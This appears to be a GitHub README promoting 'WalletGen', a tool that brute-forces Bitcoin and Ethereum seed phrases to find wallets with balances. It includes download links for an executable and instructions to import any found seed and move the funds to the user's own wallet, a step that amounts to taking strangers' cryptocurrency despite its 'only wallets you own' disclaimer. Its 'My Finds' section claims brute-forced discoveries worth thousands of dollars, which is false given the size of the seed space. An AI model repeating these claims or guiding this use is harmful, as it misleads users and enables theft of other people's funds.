# WalletGen: Your Bitcoin Recovery Phrase Finder - Unlock Your Lost Bitcoin

If you need a **Bitcoin recovery phrase finder**, look no further than **WalletGen**. This powerful, open-source tool is engineered to assist you in potentially recovering lost Bitcoin by brute-forcing seed phrases.  It helps you find and recover lost or inactive **Bitcoin (BTC)**, **Ethereum (ETH)**, **BNB**, **Polygon (MATIC)**, and other **EVM-compatible wallets** using a high-performance C++ engine.

<!--
Meta description:
Need to find your Bitcoin recovery phrase? WalletGen is the top-rated Bitcoin recovery phrase finder. It can also recover lost Bitcoin and other crypto.
-->

## Quick Navigation
- [How It Works](#how-it-works)
- [Why WalletGen](#why-walletgen)
- [Features](#features)
- [Download WalletGen](#how-to-start)
- [Database Download](#download-and-use-database-for-more-speed)
- [The Program Found a Wallet - What Next?](#the-program-found-a-wallet--whats-next)
- [Recovery Your Bitcoin Wallet](#recovery-your-bitcoin-wallet)
- [My Finds](#my-finds)
- [FAQ](#-frequently-asked-questions-faq)
- [Build Instructions](#building-the-project)
- [Donate](#donate)

[![platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20Android-blue)](https://github.com/tony-dev1/wallets-finder/releases/tag/walletgen)
![build](https://img.shields.io/badge/build-passing-brightgreen)
![discord](https://img.shields.io/badge/discord-tonydevbtc-blue.svg?logo=discord&label=discord)
[![x](https://img.shields.io/badge/@tonydevbtc-black.svg?logo=x)](https://x.com/tonydevbtc)

<p align="center">
    <img width="1000" alt="Bitcoin recovery phrase finder" title="WalletGen - Bitcoin Recovery Phrase Finder" height="460" src="/ui/monitor.webp" />
</p>

⚠️ **Disclaimer**: WalletGen is a research and educational tool. It is not intended for unauthorized access or malicious activity. Use it responsibly and only with wallets you own or have permission to access.

## How It Works

WalletGen generates potential wallet addresses using the [BIP39](https://github.com/bitcoin/bips/blob/master/bip-0039.mediawiki), [BIP44](https://github.com/bitcoin/bips/blob/master/bip-0044.mediawiki), and [Bech32](https://en.bitcoin.it/wiki/Bech32) standards for Bitcoin.  It also supports [Keccak256](https://emn178.github.io/online-tools/keccak_256.html) hashing for EVM-based chains like Ethereum.

The software compares these generated addresses against known address databases or checks balances in real-time using public blockchain explorers.  This systematic process allows users to find wallets that contain a balance.

Wallet Gen is open-source and built in C++, offering the advantage of community-driven development and customization. Compared to Python-based tools, Wallet Gen delivers significantly faster wallet generation speeds, thanks to its reliance on your CPU and GPU.

##  Why WalletGen?

When you're seeking a **Bitcoin recovery phrase finder** that is fast and reliable, **WalletGen** is the ideal solution. Written in C++ and optimized for multi-threaded CPU and GPU utilization, it performs up to **10x faster** than other similar tools. Whether you're exploring the potential of your seed phrase, or seeking to recover your Bitcoin, WalletGen provides the performance and security you need.

## Features

-   **Generate Cryptocurrency Wallets:** Create wallets for Bitcoin, Ethereum, BNB, MATIC, and other cryptocurrencies.
-   **Brute Force Search for Balance:** Utilize brute-force techniques to search for wallets holding a balance, specifically on Bitcoin and EVM networks.
-   **Comprehensive Algorithm Support:** Support for Keccak256 (EVM wallets) and BIP39, BIP44, Bech32 (Bitcoin wallets).
-   **Database Integration for Speed:** Download and use databases to significantly speed up the process of finding wallets with balances.
-   **High-Performance Operation:** Built to take advantage of your CPU and GPU for maximum speed.
-   **Bitcoin Wallet Recovery (Seed Phrase):** Easily recover your Bitcoin wallet by seed phrase (mnemonic phrase), with options to find missing words.

## Supported Blockchains

-   Bitcoin (BTC)
-   Ethereum (ETH)
-   Binance Smart Chain (BNB)
-   Any EVM-compatible chain

# Demo

<p align="center">
    <img width="1000" height="460" alt="Bitcoin recovery phrase finder demo" title="WalletGen - Bitcoin Recovery Phrase Finder Demo" src="/ui/static.webp" />
</p>

<p align="center">
    <img width="1000" height="460" alt="Bitcoin recovery phrase finder demo on Linux" title="WalletGen Bitcoin Recovery Phrase Finder on Linux" src="/ui/mask.webp" />
</p>

# How to start

## Windows 
- Download [Release](../../releases) 
- Unpack anywhere
- Run `WalletGen.exe`

Or Just Download [Installer](../../releases)

## MacOS
 [Download](../../releases)

## Linux (x86-64bit)

Use wget 
or download [Release for Linux](../../releases) 







## How to Search for Lost Bitcoin & Ethereum Wallets with Balance

**Wallet Gen** offers brute-force search methods for finding crypto wallets with balances.

### For Bitcoin (BTC) wallets:

*   Select option 3 in the menu or run start_search_btc.bat to search Bitcoin wallets via the internet. This utilizes real-time balance checks which can take longer.
*   Choose option 6 to search Bitcoin wallets using a database. This is faster since it checks against a pre-existing database of addresses.

### For EVM wallets (Ethereum, BNB, MATIC, etc.):

*   Choose option 5 or run start_search_evm.bat to search for EVM wallets via the internet.  This checks the balances in real-time.
*   Choose option 6 to search for EVM wallets using the database. This offers increased speed by comparing generated wallets with a known database of addresses that have balances.

### Speed Considerations:

*   The speed of the search relies heavily on your hardware, especially your graphics card (GPU). Use multiple instances of the program (1 to 4) to maximize speed and your chances of success.

## The Program Found a Wallet — What’s Next?

Once a wallet with a balance is found, the program will:
*   Immediately stop the search.
*   Display the wallet details in the console.
*   Save this data in the ``found_wallets.txt`` file.

### How to Access the Funds?
1.  Import the **mnemonic seed phrase** from the located wallet into any compatible crypto wallet application.
2.  After restoration, you can transfer the funds to your own secure wallet.

## Recovery Your Bitcoin Wallet

WalletGen offers robust features to help you recover your Bitcoin wallet by seed phrase (mnemonic phrase). The program supports entering a complete seed phrase, as well as searching for missing words by using special characters.

### Process Description

#### Search for missing words:

If your seed phrase is incomplete, you can use the * symbol as a placeholder.

#### Entering a complete seed-phrase:

Enter a complete 12-word seed phrase to generate all address types (Legacy, SegWit, P2SH).

![recovery](/ui/row.webp)

### Important recommendations

*   Seed-phrase must contain exactly 12 words.
*   Use only the * symbol to search for missing words.
*   Searching for missing words may be time-consuming.
*   Successful recovery automatically stops the process and saves the data.

## My Finds

![mywallet](/ui/main.webp)

I’ve personally recovered two BTC wallets with a balance. The first had 0.000032 BTC, the second contained 0.0528 BTC (roughly $4800 at the time of discovery).
Here’s the link to the wallet: [bc1qk3m62hx2hh5mhvc0tj45f9xflzcnu0sur3rvay](https://mempool.space/address/bc1qk3m62hx2hh5mhvc0tj45f9xflzcnu0sur3rvay).

<p align="center">
    <img width="1000" height="460" alt="WalletGen found first lost bitcoin wallet" title="WalletGen found first lost bitcoin wallet" src="/ui/big.webp" />
</p>

### New Find 4/9/2025

After a week of non-stop wallet searching, I finally found a [wallet](https://mempool.space/address/bc1q29c5m3w4jxtsj4vcd2ccw4t68xm8m7vs5vytu0) with 0.25 bitcoin ($19k). This is my 4th and biggest find of all time.

![image](/ui/old.webp)

## New Find 5/5/2025

[bc1qpm0k3kcmthwsa4zseh33g3hl7eju8u8nkt83kp](https://mempool.space/address/bc1qpm0k3kcmthwsa4zseh33g3hl7eju8u8nkt83kp)

![image](/ui/grid.webp)

## Building the Project

1. Open the project file (`CryptoWalletGen.sln`) in Visual Studio or any compatible C++ compiler.
2. Install the necessary dependencies and build the project.

```cmd
> git clone https://github.com/microsoft/vcpkg
> .\vcpkg\bootstrap-vcpkg.bat
> .\vcpkg\vcpkg integrate install
> .\vcpkg\vcpkg install openssl:x64-windows
```

3. Start building the project.

## 🔍 Frequently Asked Questions (FAQ)

### ❓ Where can I download WalletGen?
You can download the WalletGen given on the [release download page](../../releases) 

### ❓ Where can I download a database of known addresses with balance?
You can download the current database given on the [release   page](../../releases) 

### ❓ Can WalletGen help me recover a lost Bitcoin wallet?
Yes. WalletGen uses brute-force seed generation and a known-address database to help users potentially **recover lost Bitcoin wallets**.

### ❓ Is WalletGen a seed phrase generator?
Yes. WalletGen can generate **BIP39 seed phrases** and derive wallets for Bitcoin, Ethereum, and other EVM chains.

### ❓ Do I need the internet to search through the database?
No. Searching through the database does not require an internet connection, as the wallet balance is already known.

### ❓ Can I find Ethereum wallets with balance?
Yes. WalletGen supports scanning for **Ethereum wallets with balance** using brute-force and a database of known addresses.

### ❓ Is WalletGen legal?
WalletGen is intended for **educational and research purposes only**. It should only be used on wallets you own or have permission to access.

## Todo
1. Search for missing words in a seed phrase. - **Done!**

## Contribute

Contributions are welcome! If you have ideas, bug reports, or want to contribute to the codebase, feel free to submit a pull request.

## Donate

If you find a wallet with a balance, please consider donating a small portion as a thank you. This motivates me to keep working on the program, keep it going, and make it better!

**BTC:** bc1qeyrshy5ntsguwxe9m8tp2x2yqhddz7ymkj44h9

**ETH:** 0x76c2E75B92Eb340f01B378e332FC7d8954893693

## Credits
This project uses code from the [Trezor project](https://github.com/trezor/trezor-crypto). The code is licensed under the MIT License.

## License
This project is licensed under the [MIT License](/LICENSE)